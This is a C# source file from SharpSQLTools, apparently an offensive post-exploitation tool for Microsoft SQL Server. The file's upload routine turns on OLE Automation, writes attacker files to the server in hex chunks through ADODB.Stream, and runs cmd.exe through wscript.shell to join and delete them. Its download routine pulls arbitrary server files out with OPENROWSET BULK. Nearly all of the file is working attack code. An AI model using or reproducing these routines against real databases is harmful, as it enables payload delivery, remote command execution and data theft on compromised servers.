using System;
using System.Collections;
using System.Data.SqlClient;
using System.IO;
using System.Linq;
using System.Threading;

namespace SharpSQLTools.FunModule
{
    /// <summary>
    /// 文件上传下载类
    /// </summary>
    class FilesOptions
    {
        SqlConnection Conn;
        Setting setting;
        String sqlstr;

        public FilesOptions(SqlConnection Conn, Setting setting)
        {
            this.Conn = Conn;
            this.setting = setting;
        }

        /// <summary>
        ///  把字符串按照指定长度分割
        /// </summary>
        /// <param name="txtString">字符串</param>
        /// <param name="charNumber">长度</param>
        /// <returns></returns>
        private ArrayList GetSeparateSubString(string txtString, int charNumber)
        {
            ArrayList arrlist = new ArrayList();
            string tempStr = txtString;
            for (int i = 0; i < tempStr.Length; i += charNumber)
            {
                if ((tempStr.Length - i) > charNumber)//如果是，就截取
                {
                    arrlist.Add(tempStr.Substring(i, charNumber));
                }
                else
                {
                    arrlist.Add(tempStr.Substring(i));//如果不是，就截取最后剩下的那部分
                }
            }
            return arrlist;
        }

        /// <summary>
        /// 文件上传，使用 OLE Automation Procedures 的 ADODB.Stream
        /// </summary>
        /// <param name="localFile">本地文件</param>
        /// <param name="RemoteFile">远程文件</param>
        public void UploadFiles(String localFile, String remoteFile)
        {
            Console.WriteLine(String.Format("[*] Uploading '{0}' to '{1}'...", localFile, remoteFile));

            if (setting.Check_configuration("Ole Automation Procedures", 0))
            {
                if (setting.Enable_ola()) return;
            }

            int count = 0;
            try
            {
                string hexString = string.Concat(File.ReadAllBytes(localFile).Select(b => b.ToString("X2")));

                ArrayList arrlist = GetSeparateSubString(hexString, 150000);

                foreach (string hex150000 in arrlist)
                {
                    count++;
                    string filePath = String.Format("{0}_{1}.config_txt", remoteFile, count);

                    sqlstr = String.Format(@"
                        DECLARE @ObjectToken INT
                        EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT
                        EXEC sp_OASetProperty @ObjectToken, 'Type', 1
                        EXEC sp_OAMethod @ObjectToken, 'Open'
                        EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{0}
                        EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL,'{1}', 2
                        EXEC sp_OAMethod @ObjectToken, 'Close'
                        EXEC sp_OADestroy @ObjectToken", hex150000, filePath);

                    Batch.RemoteExec(Conn, sqlstr, false);
                    if (setting.File_Exists(filePath))
                    {
                        Console.WriteLine("[+] {0}-{1} Upload completed", arrlist.Count, count);
                    }
                    else
                    {
                        Console.WriteLine("[!] {0}-{1} Error uploading", arrlist.Count, count);
                        Conn.Close();
                        Environment.Exit(0);
                    }

                    Thread.Sleep(5000);
                }

                string shell = String.Format(@"
                    DECLARE @SHELL INT 
                    EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT 
                    EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\windows\system32\cmd.exe /c ");

                sqlstr = "copy /b ";
                for (int i = 1; i < count + 1; i++)
                {
                    if (i != count)
                    {
                        sqlstr += String.Format(@"{0}_{1}.config_txt+", remoteFile, i);
                    }
                    else
                    {
                        sqlstr += String.Format(@"{0}_{1}.config_txt {0}'", remoteFile, i);
                    }
                }

                Console.WriteLine(@"[+] copy /b {0}_x.config_txt {0}", remoteFile);
                Batch.RemoteExec(Conn, shell + sqlstr, false);
                Thread.Sleep(5000);

                sqlstr = String.Format(@"del {0}*.config_txt'", remoteFile.Replace(Path.GetFileName(remoteFile), ""));
                Console.WriteLine("[+] {0}", sqlstr.Replace("'", ""));
                Batch.RemoteExec(Conn, shell + sqlstr, false);

                if (setting.File_Exists(remoteFile))
                {
                    Console.WriteLine("[*] '{0}' Upload completed", localFile);
                }
            }
            catch (Exception ex)
            {
                Conn.Close();
                Console.WriteLine("[!] Error log: \r\n" + ex.Message);
            }
        }

        /// <summary>
        /// 文件下载，使用 OPENROWSET + BULK。将 memoryStream 直接写入文件
        /// </summary>
        /// <param name="remoteFile">远程文件</param>
        /// <param name="localFile">本地文件</param>
        public void DownloadFiles(String localFile, String remoteFile)
        {
            Console.WriteLine(String.Format("[*] Downloading '{0}' to '{1}'...", remoteFile, localFile));

            if (!setting.File_Exists(remoteFile))
            {
                Console.WriteLine("[!] {0} file does not exist....", remoteFile);
                return;
            }

            sqlstr = String.Format(@"SELECT * FROM OPENROWSET(BULK N'{0}', SINGLE_BLOB) rs", remoteFile); // SINGLE_BLOB 选项将它们读取为二进制文件
            SqlCommand sqlComm = new SqlCommand(sqlstr, Conn);

            //接收查询到的sql数据
            using (SqlDataReader reader = sqlComm.ExecuteReader())
            {
                //读取数据 
                while (reader.Read())
                {
                    using (MemoryStream memoryStream = new MemoryStream((byte[])reader[0]))
                    {
                        using (FileStream fileStream = new FileStream(localFile, FileMode.Create, FileAccess.Write))
                        {
                            byte[] bytes = new byte[memoryStream.Length];
                            memoryStream.Read(bytes, 0, (int)memoryStream.Length);
                            fileStream.Write(bytes, 0, bytes.Length);
                        }
                    }
                }
            }

            Console.WriteLine("[*] '{0}' Download completed", remoteFile);
        }
    }
}
